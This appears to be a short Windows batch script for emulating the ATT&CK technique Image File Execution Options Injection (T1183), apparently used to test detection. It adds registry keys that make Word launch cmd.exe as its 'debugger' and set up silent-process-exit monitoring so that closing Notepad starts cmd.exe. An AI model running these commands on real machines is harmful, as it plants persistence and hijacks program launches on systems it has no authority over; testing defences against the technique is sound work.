@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Image File Execution Options Injection (T1183)
ECHO.
ECHO [+] Adding Registry Keys
ECHO -------------------------------------------------------------------
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe" /v Debugger /d "cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "cmd.exe"
ECHO.
